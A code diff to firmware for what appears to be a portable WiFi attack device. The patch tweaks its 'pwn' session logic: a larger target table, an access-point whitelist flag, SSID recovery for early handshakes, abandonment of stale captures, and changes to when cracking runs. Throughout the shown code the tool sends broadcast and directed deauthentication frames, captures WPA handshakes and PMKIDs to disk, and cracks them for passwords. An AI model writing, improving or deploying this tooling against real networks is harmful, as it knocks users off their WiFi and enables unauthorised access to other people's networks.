@@ -51,7 +51,7 @@ extern WiFiFunctions  wifiFunctions;
 // ── tunables (draft; see plan §5) ─────────────────────────────────────────────
 static const uint8_t PWN_CHANS[]   = {1, 6, 11};
 #define PWN_RECON_MS       4000
-#define PWN_MAX_TARGETS    32
+#define PWN_MAX_TARGETS    64
 #define PWN_CRACK_SLICE_MS 500      // keep slices short so the UI stays responsive
 #define PWN_RSSI_CUTOFF    (-80)
 #define PWN_RING           24
@@ -102,17 +102,19 @@ struct PwnTarget {
     uint8_t ch;
     int8_t  rssi;
     bool    captured;      // usable .cap already on disk
+    bool    wl;            // whitelisted — never attack/capture (tracked so its SSID is known)
 };
 static PwnTarget s_targ[PWN_MAX_TARGETS];
 static int       s_nTarg = 0;
 
 struct PwnCapBuf {
-    bool    active;
-    uint8_t bssid[6];
-    char    ssid[33];
-    uint8_t m1[PWN_FRAME_MAX]; uint16_t m1Len; bool haveM1;
-    uint8_t m2[PWN_FRAME_MAX]; uint16_t m2Len; bool haveM2;
-    bool    m1HasPmkid;
+    bool     active;
+    uint32_t startMs;      // when this capture began — abandoned if it never completes
+    uint8_t  bssid[6];
+    char     ssid[33];
+    uint8_t  m1[PWN_FRAME_MAX]; uint16_t m1Len; bool haveM1;
+    uint8_t  m2[PWN_FRAME_MAX]; uint16_t m2Len; bool haveM2;
+    bool     m1HasPmkid;
 };
 static PwnCapBuf s_cap;
 
@@ -432,7 +434,12 @@ static void pwnGeo(char* latS, char* lonS, size_t n) {
 // write the in-progress capture to a .cap (synth beacon + M1 [+ M2]) + log it
 static bool s_lastSaveOk = false; static char s_lastSaveFile[80];
 static void flushCapture(int8_t rssi, uint8_t ch) {
-    if (!s_cap.active || !s_cap.haveM1 || !s_cap.ssid[0]) return;
+    if (!s_cap.active || !s_cap.haveM1) return;
+    if (!s_cap.ssid[0]) {                          // M1 arrived before any beacon → recover the
+        PwnTarget* tt = targFind(s_cap.bssid);     // SSID from the target table (a beacon since?)
+        if (tt && tt->ssid[0]) strncpy(s_cap.ssid, tt->ssid, 32);
+    }
+    if (!s_cap.ssid[0]) return;                     // still unknown (hidden SSID) → can't crack, skip
     bool isHs = s_cap.haveM2;
     bool isPmkid = s_cap.m1HasPmkid;
     if (!isHs && !isPmkid) return;                 // nothing crackable yet
@@ -478,7 +485,10 @@ static char drainOne(uint8_t curCh) {
         char ssid[33] = {0};
         dot11::extractSSID(fr.data, fr.len, dot11::ST_BEACON, ssid, sizeof(ssid));
         const uint8_t* b = fr.data + 10;                // beacon: SA/BSSID at +10/+16
-        if (!whitelisted(b, ssid)) targAdd(b, ssid, curCh, fr.rssi);
+        // Always track (even whitelisted) so we KNOW the SSID and can honour an
+        // SSID-whitelist on this AP's handshakes; the wl flag blocks attack + capture.
+        PwnTarget* t = targAdd(b, ssid, curCh, fr.rssi);
+        if (t) t->wl = whitelisted(b, ssid);
         return 'B';
     }
     if (fr.kind == 2) {                                 // data frame → learn a client STA
@@ -498,15 +508,15 @@ static char drainOne(uint8_t curCh) {
     const uint8_t* b = dot11::dataBssid(fr.data);
     PwnTarget* t = targFind(b);
     if (t) t->rssi = fr.rssi;                            // refresh signal
-    if (t && t->captured) return 0;                     // already have it
+    if (t && (t->captured || t->wl)) return 0;          // already own it OR whitelisted
     char ssidTmp[33] = {0}; if (t) strncpy(ssidTmp, t->ssid, 32);
-    if (whitelisted(b, ssidTmp)) return 0;
+    if (whitelisted(b, ssidTmp)) return 0;              // bssid-whitelist even without a target yet
 
     if (ev.msg == 1) {
         // start/refresh capture for this bssid
         if (!s_cap.active || memcmp(s_cap.bssid, b, 6) != 0) {
             memset(&s_cap, 0, sizeof(s_cap));
-            s_cap.active = true; memcpy(s_cap.bssid, b, 6);
+            s_cap.active = true; s_cap.startMs = millis(); memcpy(s_cap.bssid, b, 6);
             if (t) strncpy(s_cap.ssid, t->ssid, 32);
         }
         memcpy(s_cap.m1, fr.data, fr.len); s_cap.m1Len = fr.len; s_cap.haveM1 = true;
@@ -658,7 +668,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     uint32_t apCount = 0, hsCount = 0, pmCount = 0, pwnedCount = 0;
     char ticker[40] = "roaming...";
     char mood[10] = "IDLE";
-    uint32_t hopAt = 0, drawAt = 0, pwnFlash = 0, toastUntil = 0, frame = 0, crackAt = 0;
+    uint32_t hopAt = 0, drawAt = 0, pwnFlash = 0, toastUntil = 0, frame = 0, crackAt = 0, lastMoodEvt = 0, lastM1Ms = 0;
     bool running = true;
     char toast[28] = {0};
     uint32_t t0Session = millis();
@@ -696,7 +706,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             // attack this channel's known targets (skip in passive; don't hop mid-capture)
             if (mode != PWN_PASSIVE && !(s_cap.active && s_cap.haveM1 && !s_cap.haveM2)) {
                 for (int i = 0; i < s_nTarg; i++) {
-                    if (s_targ[i].ch != curCh || s_targ[i].captured) continue;
+                    if (s_targ[i].ch != curCh || s_targ[i].captured || s_targ[i].wl) continue;
                     if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
                     if (mode == PWN_STEALTH) {
                         // stealth: ONE directed deauth to a discovered client — no broadcast
@@ -704,7 +714,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                         const uint8_t* c = cliFor(s_targ[i].bssid);
                         if (c) { sendDeauth(s_targ[i].bssid, c); break; }
                     } else {
-                        sendDeauth(s_targ[i].bssid, nullptr);   // active: broadcast, all targets
+                        sendDeauth(s_targ[i].bssid, nullptr);   // active: broadcast
                     }
                 }
             }
@@ -716,8 +726,8 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         // drain sniffed frames
         char ev = drainOne(curCh);
         if (ev == 'B') { apCount = s_nTarg; }
-        else if (ev == '1') { strcpy(mood, "HUNT"); }
-        else if (ev == '2') { strcpy(mood, "EXCITED"); }
+        else if (ev == '1') { strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; }
+        else if (ev == '2') { strcpy(mood, "EXCITED"); lastMoodEvt = now; }
 
         // complete a capture?
         if (s_cap.active && s_cap.haveM1 && (s_cap.haveM2 || s_cap.m1HasPmkid)) {
@@ -726,13 +736,25 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             flushCapture(tt ? tt->rssi : 0, tt ? tt->ch : curCh);
             if (wasHs) { hsCount++; snprintf(ticker, sizeof(ticker), "+HS %.24s", s_lastSaveFile + sizeof(SD_DIR_PWN)); }
             else       { pmCount++; snprintf(ticker, sizeof(ticker), "+PMKID captured"); }
-            strcpy(mood, "EXCITED");
+            strcpy(mood, "EXCITED"); lastMoodEvt = now;
         }
 
+        // Abandon a stale incomplete capture (an M1 that never got its M2/PMKID). Without
+        // this s_cap.active stays set forever and blocks BOTH new captures and idle
+        // cracking — the "found APs but stuck on IDLE, never cracks" bug.
+        if (s_cap.active && (now - s_cap.startMs) > 3000) s_cap.active = false;
+
         // idle → crack a cap for one slice (rotate past solved/exhausted caps).
-        // Throttled so a fully-exhausted backlog can't re-scan SD every loop (was a lag source).
-        bool anyActivity = (s_rTail != s_rHead) || (s_cap.active);
-        if (!anyActivity && now >= crackAt) {
+        // "Idle" = no handshake capture in progress AND not right after a deauth (so a
+        // triggered handshake still lands). Ambient beacons do NOT block cracking — that
+        // was the bug that kept it stuck on IDLE. Throttled so an exhausted backlog can't
+        // re-scan SD every loop.
+        // crack unless a handshake is genuinely in flight: only pause briefly (1.2s) after
+        // an actual M1 so its M2 can land. Deauth alone does NOT block cracking (a deauth
+        // with no reconnecting client produces no handshake), so a busy active-mode channel
+        // can't starve the cracker.
+        bool canCrack = (now - lastM1Ms) > 1200;
+        if (canCrack && now >= crackAt) {
             crackAt = now + 700;
             std::vector<String> caps;
             if (backlog) {                                 // all caps on disk
@@ -761,9 +783,15 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                     snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found); }
                 else { strcpy(mood, "CRACK");
                     snprintf(ticker, sizeof(ticker), "crack %.14s  %s", ss[0] ? ss : cp.c_str() + sizeof(SD_DIR_PWN), prog); }
+                lastMoodEvt = now;
                 break;
             }
         }
+
+        // mood decay: after a quiet stretch (no capture/crack event) settle back to
+        // IDLE, or LONELY when no APs are in range at all.
+        if ((now - lastMoodEvt) > 2500 && !s_cap.active)
+            strcpy(mood, s_nTarg ? "IDLE" : "LONELY");
 
         // redraw ~8fps (phoenix animates)
         if (LockScreenManager::getInstance().consumeJustUnlocked()) { drawChrome(); drawAt = 0; }
@@ -776,7 +804,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
             // strongest live signal (uncaptured targets)
             int8_t best = 0;
             for (int i = 0; i < s_nTarg; i++)
-                if (!s_targ[i].captured && s_targ[i].rssi != 0 && (best == 0 || s_targ[i].rssi > best))
+                if (!s_targ[i].captured && !s_targ[i].wl && s_targ[i].rssi != 0 && (best == 0 || s_targ[i].rssi > best))
                     best = s_targ[i].rssi;
             int bars = best == 0 ? 0 : best >= -55 ? 4 : best >= -67 ? 3 : best >= -77 ? 2 : best >= -86 ? 1 : 0;
 
@@ -897,11 +925,15 @@ void runPwn(char* args) {
             if (!a1) { dm.println("usage: pwn wl add <idx|bssid>|ssid <name>"); dm.printCommandScreen(); return; }
             if (!strcmp(a1, "ssid")) {
                 char* nm = strtok(nullptr, "");             // rest of line = name
-                if (nm) { while (*nm == ' ') nm++; wlAppend("ssid", nm, "");
-                    dm.setTextColor(TFT_YELLOW);
-                    dm.setCursor(4, dm.getCursorY());
-                    char w[52]; snprintf(w, sizeof(w), "WARN: skips ALL APs named %.24s", nm); dm.println(w); }
-                wlList(dm); return;
+                if (!nm || !*nm) { dm.println("usage: pwn wl add ssid <name>"); dm.printCommandScreen(); return; }
+                while (*nm == ' ') nm++;
+                wlAppend("ssid", nm, "");
+                dm.clearScreen(); dm.setCursor(4, outputY);   // dedicated confirm (wlList would wipe it)
+                dm.setTextColor(TFT_GREEN);
+                char b[52]; snprintf(b, sizeof(b), "Whitelisted SSID: %.28s", nm); dm.println(b);
+                dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_YELLOW);
+                dm.println("WARN: skips ALL APs with this name.");
+                dm.printCommandScreen(); return;
             }
             uint8_t bssid[6]; char ssid[33] = {0};
             if (macParse(a1, bssid)) { char m[18]; macStr(bssid, m); wlAppend("bssid", m, ""); }
